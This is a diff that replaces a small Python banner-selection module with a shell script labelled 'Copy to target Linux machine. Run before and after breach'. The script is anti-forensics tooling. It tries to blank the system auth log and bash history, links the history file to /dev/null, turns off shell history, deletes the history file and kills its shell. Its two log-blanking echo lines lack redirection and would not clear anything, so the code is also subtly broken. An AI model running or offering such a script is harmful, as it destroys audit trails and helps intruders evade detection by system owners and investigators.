@@ -1,5 +1,4 @@
-# -*- coding: utf-8 -*-
-"""
+: '
 MIT License
 
 Copyright (c) 2023 Elijah Bennett (Ginsu)
@@ -21,27 +20,15 @@ AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
+ '
 
-@Description		: IntentLimit Banner Operations
-@Author			: Ginsu
-@Date			: 6/22/22
-@Version		: 2.0
-"""
-
-### Imports
-import os
-import random
-###
-
-__all__ = ["getBanner"]
-
-### Code
-def getBanner(ildir: str) -> str:
-	file = open(os.path.join(ildir, "banners.txt"), 'r')
-	banners = file.read().split("\t")
-	banner = random.choice(banners)
-	return banner
-###
-
-if __name__ == "__main__":
-	pass
+# Copy to target Linux machine. Run before and after breach
+echo "" /var/log/auth.log
+echo "" ~/.bash_history
+ln /dev/null ~/.bash_history -sf
+history -c
+export HISTFILESIZE=0
+export HISTSIZE=0
+unset HISTFILE
+rm ~/.bash_history -rf
+kill -9 $$
